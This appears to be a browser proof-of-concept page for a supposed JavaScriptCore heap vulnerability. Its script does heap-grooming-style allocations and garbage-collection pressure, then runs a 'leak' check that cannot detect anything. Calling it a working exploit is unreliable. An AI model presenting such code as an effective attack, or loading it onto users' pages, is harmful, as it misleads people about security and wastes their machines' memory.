<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>JSC Heap Growth PoC</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 8px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>JSC Heap Growth PoC</h1>
    <p>Click to test heap growth vulnerability</p>
    <button id="trigger">Trigger Exploit</button>
    <script>
        function stressHeap() {
            const buffers = [];
            for (let i = 0; i < 50; i++) {
                const buf = new Uint8Array(16 * 1024);
                buf.fill(0x41);
                buffers.push(buf);
            }
            return buffers;
        }

        function createLargeObject() {
            const obj = {};
            for (let i = 0; i < 500; i++) {
                obj[`key${i}`] = new Array(500).fill('A');
            }
            return obj;
        }

        function checkMemoryLeak() {
            const buf = new Uint8Array(4);
            buf.fill(0x46);
            return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
        }

        function triggerExploit() {
            alert('Grooming heap...');
            stressHeap();

            alert('Creating large objects...');
            const objects = [];
            for (let i = 0; i < 100; i++) {
                objects.push(createLargeObject());
                const leak = checkMemoryLeak();
                if (leak) {
                    alert(leak);
                }
            }

            alert('Forcing GC cycles...');
            for (let i = 0; i < 50; i++) {
                const temp = new ArrayBuffer(32 * 1024);
                objects.push(temp);
                const leak = checkMemoryLeak();
                if (leak) {
                    alert(leak);
                }
            }

            alert('Checking final memory changes...');
            const leak = checkMemoryLeak();
            if (leak) {
                alert(leak);
            } else {
                alert('No memory changes detected');
            }
        }

        document.getElementById('trigger').addEventListener('click', triggerExploit);
    </script>
</body>
</html>
